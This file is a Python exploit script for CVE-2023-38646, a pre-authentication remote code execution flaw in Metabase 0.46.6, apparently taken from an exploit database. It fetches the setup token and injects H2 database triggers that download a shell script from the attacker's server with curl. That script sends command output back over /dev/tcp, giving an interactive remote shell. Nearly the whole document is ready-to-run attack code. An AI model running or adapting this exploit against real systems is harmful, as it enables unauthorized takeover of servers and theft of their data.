@@ -1,0 +1,171 @@
+id: 39335
+date: 02/17/2024
+title: Metabase 0.46.6 - Pre-Auth Remote Code Execution Exploit
+author: Musyoka Ian
+cves: CVE-2023-38646
+
+# Exploit Title: metabase 0.46.6 - Pre-Auth Remote Code Execution
+# Exploit Author: Musyoka Ian
+# Vendor Homepage: https://www.metabase.com/
+# Software Link: https://www.metabase.com/
+# Version: metabase 0.46.6
+# Tested on: Ubuntu 22.04, metabase 0.46.6
+# CVE : CVE-2023-38646
+
+#!/usr/bin/env python3
+
+import socket
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from typing import Any
+import requests
+from socketserver import ThreadingMixIn
+import threading
+import sys
+import argparse
+from termcolor import colored
+from cmd import Cmd
+import re
+from base64 import b64decode
+
+
+class Termial(Cmd):
+    prompt = "metabase_shell > "
+    def default(self,args):
+        shell(args)
+
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        global success
+        if self.path == "/exploitable":
+            
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(f"#!/bin/bash\n$@ | base64 -w 0  > /dev/tcp/{argument.lhost}/{argument.lport}".encode())
+            success = True
+
+        else:
+            print(self.path)
+            #sys.exit(1)
+    def log_message(self, format: str, *args: Any) -> None:
+        return None
+
+class Server(HTTPServer):
+    pass
+
+def run():
+    global httpserver
+    httpserver = Server(("0.0.0.0", argument.sport), Handler)
+    httpserver.serve_forever()
+
+def exploit():
+    global success, setup_token
+    print(colored("[*] Retriving setup token", "green"))
+    setuptoken_request = requests.get(f"{argument.url}/api/session/properties")
+    setup_token = re.search('"setup-token":"(.*?)"', setuptoken_request.text, re.DOTALL).group(1)
+    print(colored(f"[+] Setup token: {setup_token}", "green"))
+    print(colored("[*] Tesing if metabase is vulnerable", "green"))
+    payload = {
+        "token": setup_token,
+        "details":
+        {
+            "is_on_demand": False,
+            "is_full_sync": False,
+            "is_sample": False,
+            "cache_ttl": None,
+            "refingerprint": False,
+            "auto_run_queries": True,
+            "schedules":
+            {},
+            "details":
+            {
+                "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('http://{argument.lhost}:{argument.sport}/exploitable').openConnection().getContentLength()\n$$--=x\\;",
+                "advanced-options": False,
+                "ssl": True
+                },
+                "name": "an-sec-research-musyoka",
+                "engine": "h2"
+                }
+                }
+    timer = 0
+    print(colored(f"[+] Starting http server on port {argument.sport}", "blue"))
+    thread = threading.Thread(target=run, )
+    thread.start()
+    while timer != 120:
+        test = requests.post(f"{argument.url}/api/setup/validate", json=payload)
+        if success == True :
+            print(colored("[+] Metabase version seems exploitable", "green"))
+            break
+        elif timer == 120:
+            print(colored("[-] Service does not seem exploitable exiting ......", "red"))
+            sys.exit(1)
+
+    print(colored("[+] Exploiting the server", "red"))
+    
+
+    terminal = Termial()
+    terminal.cmdloop()
+
+
+def shell(command):
+    global setup_token, payload2
+    payload2 = {
+        "token": setup_token,
+        "details":
+        {
+            "is_on_demand": False,
+            "is_full_sync": False,
+            "is_sample": False,
+            "cache_ttl": None,
+            "refingerprint": False,
+            "auto_run_queries": True,
+            "schedules":
+            {},
+            "details":
+            {
+                "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl {argument.lhost}:{argument.sport}/exploitable -o /dev/shm/exec.sh')\n$$--=x",
+                "advanced-options": False,
+                "ssl": True
+                },
+                "name": "an-sec-research-team",
+                "engine": "h2"
+                }
+                }
+    
+    output = requests.post(f"{argument.url}/api/setup/validate", json=payload2)
+    bind_thread = threading.Thread(target=bind_function, )
+    bind_thread.start()
+    #updating the payload
+    payload2["details"]["details"]["db"] = f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash /dev/shm/exec.sh {command}')\n$$--=x"
+    requests.post(f"{argument.url}/api/setup/validate", json=payload2)
+    #print(output.text)
+
+
+def bind_function():
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.bind(("0.0.0.0", argument.lport))
+        sock.listen()
+        conn, addr = sock.accept()
+        data = conn.recv(10240).decode("ascii")
+        print(f"\n{(b64decode(data)).decode()}")
+    except Exception as ex:
+        print(colored(f"[-] Error: {ex}", "red"))
+        pass
+    
+
+
+if __name__ == "__main__":
+    print(colored("[*] Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]", "magenta"))
+    args = argparse.ArgumentParser(description="Exploit script for CVE-2023-38646 [Pre-Auth RCE in Metabase]")
+    args.add_argument("-l", "--lhost", metavar="", help="Attacker's bind IP Address", type=str, required=True)
+    args.add_argument("-p", "--lport", metavar="", help="Attacker's bind port", type=int, required=True)
+    args.add_argument("-P", "--sport", metavar="", help="HTTP Server bind port", type=int, required=True)
+    args.add_argument("-u", "--url", metavar="", help="Metabase web application URL", type=str, required=True)
+    argument  = args.parse_args()
+    if argument.url.endswith("/"):
+        argument.url = argument.url[:-1]
+    success = False
+    exploit()
+
+#  0day.today [2024-02-19]  #
